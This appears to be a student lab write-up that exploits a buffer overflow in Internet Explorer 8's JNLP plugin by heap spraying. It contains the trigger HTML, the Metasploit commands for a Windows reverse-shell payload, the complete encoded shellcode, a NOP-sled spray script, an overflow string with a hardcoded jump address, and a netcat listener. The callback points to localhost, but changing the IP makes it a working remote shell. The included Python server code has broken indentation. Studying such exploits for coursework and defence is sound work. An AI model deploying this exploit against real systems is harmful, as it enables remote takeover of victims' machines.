# Exploiting a Buffer Overflow Vulnerability in the JNLP plugin within Internet Explorer 8 with using the Heap Spraying Technique

JNLP (Java Network Launch Protocol) enables an application to be launched on a client desktop using resources that are hosted on a remote server. A specific version of JNLP for IE8 is vulnerable to a stack-based buffer overflow: when the plugin is invoked with a **launchjnlp** parameter, it will copy the value of the **docbase** parameter to a stack buffer using `sprintf`, but fails to check the length of the value. 

The vulnerability can be triggered by the following:
```html
<object type='application/x-java-applet'>
<param name='launchjnlp' value='1'>
<param name='docbase' value='AAAAAAAA....AAAAAA'>
</object>
```

## Goal
Input a sufficiently long string in the **docbase** value such that the register $eip gets ovewritten with an address known to contain our NOP sled and shellcode. Said shellcode establishes a reverse TCP connection to another machine.

## How it's done
To demonstrate this vulnerability, a simple web server is set up to listen on port 8080. This web server shows the contents of a specific directory in which the html file (containing the exploit) is located. The html file is clicked from the client and nothing appears to happen, but the truth is that the heap is sprayed with a shellcode! It is not until the client clicks on *Click Me* that at least one the shellcodes in the heap gets executed. This shellcode consists of several NOP operations and a reversed TCP connection to a chosen IP and port. The port used is *6666*, and to simplifly the assignment's grading, the chosen IP is 127.0.0.1, which means that the command prompt will be obtained in the client instead of in the attacker's machine (or Kali, in this case).

## Specifics
1. Two machines are used to demonstrate this vulnerability. A Windows 7 VM (with DEP disabled) acts as the client, and a Kali Linux VM acts as the web server.

2. A Windows shellcode is generated with Metasploit, which is a tool already installed in Kali Linux. The instructions in this shellcode create a reverse TCP connection from said Windows machine to a chosen IP and port. In other words, these instructions would spawn the victim's command prompt in the attacker's machine; but for practicality, the IP chosen as the attacker's IP does not belong to the attacker and it is the victim's machine, 127.0.0.1. Using the attacker's IP will make the demo realistic, but it will not make it easy to the grader of this assignment.

The shellcode is generated as follows:

`msfconsole`

`use payload/windows/shell_reverse_tcp`

`set LHOST 127.0.0.1`

`set LPORT 6666`

`generate -t js_le`

In the last command, **js_le** was used because a JavaScript shellcode is needed and the Windows machine that is targeted uses Little Endian (le).

3. To accept this reverse TCP connection in Windows, the following netcat command is needed:

`nc -l -p 6666`

**-l** specifies that nc should listen for an incoming connection, and **-p** specifies the source port.

4. Windows debugger, WinDBG, is helpful to visualize the stack and heap contents and gather information for the exploit.

5. The script that sets up a web server is provided, and it looks like this:

```python
#!/usr/bin/python
#
# Python Web Server
# Serves only static files
#
# by Saumil Shah

import sys
import BaseHTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler

port = 8080

class HandlerClass(SimpleHTTPRequestHandler):
        # Disable DNS lookups
        def address_string(self):
                    return str(self.client_address[0])
                    ServerClass = BaseHTTPServer.HTTPServer
                    Protocol = "HTTP/1.0"
                    server_address = ('0.0.0.0', port)
                    HandlerClass.protocol_version = Protocol
                    httpd = ServerClass(server_address, HandlerClass)
    try:
        sa = httpd.socket.getsockname()
        print "Serving HTTP on", sa[0], "port", sa[1], "..."
        httpd.serve_forever()
    except KeyboardInterrupt:
        print 'Shutting down the web server'
        httpd.socket.close()
```

6. To use the heap spraying technique, a string that follows the pattern "NOP Sled + Shellcode" is created in JavaScript. This string is successfully sprayed in the heap to occupy hundreds of megabytes.

7. Once we know a specific address in the heap contains the beggining of the shellcode, that is, the NOP sled, we can concatenate that address at the end of the input to **docbase** to override $eip, and therefore, be able to jump to the shellcode.

## Steps

1. Test different length inputs for **docbase** to determine the number of bytes needed to override $eip. In this case, 396 will override $eip and nothing more. This means that 392 bytes are needed just before the 4 bytes address that we want to point $eip to. This address will be determined when the heap is sprayed.

2. To spray the heap with the shellcode, an array **a** is initialized and a function **heap_spray()** is specified to populate **a**

```html
<script> 
    var a = new Array();
    function heap_spray() {
   
        var shellcode = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u50d5%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u6805%u007f%u0100%u0268%u1a00%u890a%u6ae6%u5610%u6857%ua599%u6174%ud5ff%uc085%u0c74%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff")

        var nops = unescape("%u9090%u9090");

        while(nops.length <= 0x100000-shellcode.length){
            nops += nops;
        }

        nops += shellcode;

        for(i = 0; i < 200; i++) {
            a[i] = nops;
            a[i].substring(0,1); //This is only used to trick the memory allocator 
        }
    }
    .  
    .
    .
</script>
```
The 0x90 bytes that conform the NOP sled have to be passed to the function **unescape()** to let javascript know that the string is already represented in hex. 

Without the second line within the for loop, the memory allocator fails to spray the heap and only allocates one block.

3. Just below the previous block of code is the following:

```html
<script>
    .
    .
    .
function trigger() {
    var buf = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x95\xff\xda\x09";

    var htmlTags =
    "<object type='application/x-java-applet'>" +
    "<param name='launchjnlp' value='1'>" +
    "<param name='docbase' value='" + buf + "'>" +
    "</object>";

    document.write(htmlTags);
    }
   </script>
</head>
<body onload="heap_spray()">
    <input type="button" value="Click Me" onclick="trigger()">
</body>
```

This means that as soon as we click on the page (jnlp1.html), the heap should be sprayed because of `<body onload="heap_spray">`

Loading that page, and attaching the IE tab with WinDBG, we can search for specific bytes that we know are present in the shellcode. Like this `s 0x00000000 L?0x7FFFFFFF 90 90 90 fc e8 82 00`. This would show all of the addresses that store that set of bytes. I chose x09DAFF95 because it does not contain zeroes, and therefore, will not create null bytes in the input.

We have to make sure that our chosen address contains the NOP sled. Run `dc 09daff95`

![alt text](https://github.com/pwilthew/Systems-Security/blob/master/Heap-Spray/Screen%20Shot%202017-10-08%20at%2018.16.32.png)

3. Now that we have the address to jump to, we can append it to the end of the long string of repeated "A". This will be address that will override the value $eip. To execute the buffer overflow, we have to click on "Click Me," as the function trigger() is called immediately after doing so: `<input type="button" value="Click Me" onclick="trigger()">`

Before clicking, we need to wait for incoming TCP connections in the Windows command prompt (as explained in #3 of **Specifics**).

![alt text](https://github.com/pwilthew/Systems-Security/blob/master/Heap-Spray/Screen%20Shot%202017-10-08%20at%2018.21.55.png)

4. That should be it! The program jumped to the address that contained a shellcode and the shellcode effectively established a TCP connection to the chosen IP (127.0.0.1)

![alt text](https://github.com/pwilthew/Systems-Security/blob/master/Heap-Spray/Screen%20Shot%202017-10-08%20at%2018.21.59.png)

